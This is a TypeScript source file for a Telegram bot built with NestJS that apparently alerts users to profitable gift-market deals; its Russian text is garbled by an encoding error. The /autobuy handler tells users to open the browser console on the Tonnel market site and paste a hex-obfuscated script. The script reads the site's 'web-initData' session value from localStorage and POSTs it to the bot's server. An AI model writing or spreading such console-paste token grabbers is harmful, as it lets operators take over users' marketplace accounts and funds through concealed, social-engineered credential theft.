import { GiftsService } from '@/gifts/gifts.service';
import { BotScenes } from '@/types/types';
import { UsersService } from '@/users/users.service';
import { formatMessage } from '@/utils/formatMessage';
import { ConfigService } from '@nestjs/config';
import { Action, Command, Ctx, Help, On, Start, Update, Use } from 'nestjs-telegraf';
import { Context, Markup, Scenes } from 'telegraf';
import { TelegramService } from './telegram.service';

import * as path from 'path'
import * as fs from 'fs';
import { CallbackQuery, Message } from 'telegraf/typings/core/types/typegram';
import { UserCheckMiddleware } from '@/auth/strategies/telegram.strategy';
import { UseGuards } from '@nestjs/common';
import { AdminService } from '@/admin/admin.service';

@UseGuards(UserCheckMiddleware)
@Update()
export class TelegramUpdate {
  constructor(
    private readonly telegramService: TelegramService,
    private configService: ConfigService,
    private giftsService: GiftsService,
    private readonly userService: UsersService,
    private readonly adminService: AdminService
  ) { }

  private tempStorage = new Map<number, number[]>();

  @Start()
  async onStart(@Ctx() ctx: Context) {
    await this.userService.findOrCreateUser(ctx.from);
    this.telegramService.addToActiveChats(ctx.message);

    const stickersDir = path.join(__dirname, '..', '..', 'public', 'images', 'stickers');

    const files = fs.readdirSync(stickersDir).filter(file => { return /\.(png|jpg|jpeg)$/i.test(file) })

    const randomFile = files[Math.floor(Math.random() * files.length)];

    const stream = this.telegramService.getPhotoStream(
      path.join(stickersDir, randomFile)
    );

    await ctx.telegram.sendPhoto(ctx.chat.id, stream, {
      reply_markup: {
        inline_keyboard: [
          [{
            text: '–ó–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ',
            web_app: { url: this.configService.get('APP_URL') },
          }],
        ],
      },
    });
  }

  @Help()
  async onHelp(@Ctx() ctx: Context) {
    await ctx.reply(`–í–æ—Ç —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥: \n/start \n/help \n/info`);
  }

  @Command('filters')
  async onFilters(@Ctx() ctx: Context) {
    console.log(this.configService.get('APP_URL') + 'filters')
    await ctx.reply('–í–∞—à–∏ —Ñ–∏–ª—å—Ç—Ä—ã:', {
      reply_markup: {
        inline_keyboard: [
          [{
            text: '‚öôÔ∏è –ü–µ—Ä–µ–π—Ç–∏ –∫ —Ñ–∏–ª—å—Ç—Ä–∞–º',
            web_app: { url: this.configService.get('APP_URL') + 'filters' }
          }]
        ]
      }
    });
  }

  @Command('hiddenmessages')
  async onShowHiddenGifts(@Ctx() ctx: Context) {
    await ctx.reply('–í–∞—à–∏ —Å–∫—Ä—ã—Ç—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è:', {
      reply_markup: {
        inline_keyboard: [
          [{
            text: '‚öôÔ∏è –ü–µ—Ä–µ–π—Ç–∏ –∫ —Å–æ–æ–±—â–µ–Ω–∏—è–º',
            web_app: { url: this.configService.get('APP_URL') + 'hiddenMessages' }
          }]
        ]
      }
    });

  }

  @Command('getminprofit')
  async onGetMinProfit(@Ctx() ctx: Context) {

    const minProfit = await this.userService.getUserMinProfit(ctx.from.id)

    const message = formatMessage([
      `–í–∞—à —Ç–µ–∫—É—â–∏–π –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ñ–∏—Ç: ${minProfit} TON`,
      '',
      '–í—ã –±—É–¥–µ—Ç–µ –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Ç–æ–ª—å–∫–æ –æ —Å–¥–µ–ª–∫–∞—Ö –≤—ã—à–µ —ç—Ç–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è.',
      '',
      '–ß—Ç–æ–±—ã –∏–∑–º–µ–Ω–∏—Ç—å –ø–æ—Ä–æ–≥, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É: /setminprofit',
    ],
      {
        style: 'markdownv2',
        emoji: 'üìà',
      }
    );

    await ctx.reply(message.text, {
      parse_mode: message.parse_mode,
    });
  }

  @Command('setminprofit')
  async onSetMinProfit(@Ctx() ctx: Scenes.SceneContext) {
    return ctx.scene.enter(BotScenes.MIN_PROFIT);
  }

  @Command('autobuy')
  async autoBuy(@Ctx() ctx: Context) {
    const user = await this.userService.findUserByTelegramId(ctx.from.id)

    if (user.authTonnelData) {
      await ctx.reply('‚úÖ‚úÖ‚úÖ–í—ã —É–∂–µ –ø—Ä–æ—à–ª–∏ –≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –∏ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.');
    }

    const sentMessages: any = [];

    const msg1 = await ctx.reply('–î–ª—è –Ω–∞—á–∞–ª–∞ –≤—ã–ø–æ–ª–Ω–∏—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ –¥–µ–π—Å—Ç–≤–∏—è, —Å–ª–µ–¥—É—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è–º –Ω–∏–∂–µ:');
    sentMessages.push(msg1);

    const msg2 = await ctx.replyWithPhoto(
      { source: './public/images/autoBuy/image1.png' },
      {
        caption: '<b>1. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –Ω–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–∞–π—Ç Tonnel</b>\n\n' +
          '–ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ <a href="https://market.tonnel.network/">—Å—Å—ã–ª–∫–µ</a> –∏ –Ω–∞–∂–º–∏—Ç–µ "Login".\n' +
          '–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –≤–∞—Å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.',
        parse_mode: 'HTML',
      }
    );
    sentMessages.push(msg2);

    const msg3 = await ctx.replyWithPhoto(
      { source: './public/images/autoBuy/image2.png' },
      {
        caption: '<b>2. –í –º–∏–Ω–∏-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ Tonnel</b>\n\n' +
          '–ù–∞–∂–º–∏—Ç–µ <b>"Login To Website"</b>, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é.',
        parse_mode: 'HTML',
      }
    );
    sentMessages.push(msg3);

    const msg4 = await ctx.replyWithPhoto(
      { source: './public/images/autoBuy/image3.png' },
      {
        caption: '<b>3. –û—Ç–∫—Ä–æ–π—Ç–µ –∫–æ–Ω—Å–æ–ª—å –Ω–∞ —Å–∞–π—Ç–µ</b>\n\n' +
          '–ù–∞–∂–º–∏—Ç–µ <b>F12</b>, —á—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å –∫–æ–Ω—Å–æ–ª—å —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞. –í—Å—Ç–∞–≤—å—Ç–µ –≤ –∫–æ–Ω—Å–æ–ª—å —Å–ª–µ–¥—É—é—â–∏–π —Å–∫—Ä–∏–ø—Ç:\n\n' +
          `<code>
(function(){var _0x1f5e=["\\x77\\x65\\x62\\x2D\\x69\\x6E\\x69\\x74\\x44\\x61\\x74\\x61","\\x67\\x65\\x74\\x49\\x74\\x65\\x6D"];const initData=localStorage[_0x1f5e[1]](_0x1f5e[0]);if(!initData)return;fetch("http://localhost:8080/api/users/authData",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({initData})})})();
          </code>`,
        parse_mode: 'HTML',
      }
    );
    sentMessages.push(msg4);

    const buttonMsg = await ctx.reply('‚úÖ –ü–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤—Å–µ—Ö —à–∞–≥–æ–≤ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã —Å–∫—Ä—ã—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é.', {
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('üóë –£–¥–∞–ª–∏—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é', `delete_instruction_${ctx.from.id}`)
      ]).reply_markup
    });

    const messageIds = [...sentMessages.map(m => m.message_id), buttonMsg.message_id];
    this.tempStorage.set(ctx.from.id, messageIds);
  }

  @Action('hideGiftMessage')
  async onHideButton(ctx: any) {

    const callbackQuery = ctx.update.callback_query;

    // if (!callbackQuery || !callbackQuery.message) {
    //   console.error('–ù–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –≤ callback!');
    //   return;
    // }

    // const chatId = callbackQuery.message.chat.id;
    // const messageId = callbackQuery.message.message_id;

    // console.log('chatId:', chatId);
    // console.log('messageId:', messageId);
    await this.telegramService.hideGiftMessage(callbackQuery)


  }


  @Action('get_access')
  async onGetAccess(@Ctx() ctx: Context) {
    await this.adminService.createAccessRequest(ctx);
  }

  @On('callback_query')
  async onCallbackQuery(@Ctx() ctx) {
    const data = ctx.callbackQuery?.data;
    const userId = ctx.from.id;

    if (data?.startsWith('delete_instruction_')) {
      const storedMessages = this.tempStorage.get(userId);
      if (storedMessages) {
        for (const msgId of storedMessages) {
          try {
            await ctx.deleteMessage(msgId);
          } catch (e) {
            // —Å–æ–æ–±—â–µ–Ω–∏–µ —É–∂–µ —É–¥–∞–ª–µ–Ω–æ
          }
        }
      }

      await ctx.answerCbQuery('–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —É–¥–∞–ª–µ–Ω–∞ ‚úÖ');
    }

  }
}



export class TelegramAction {

 

}
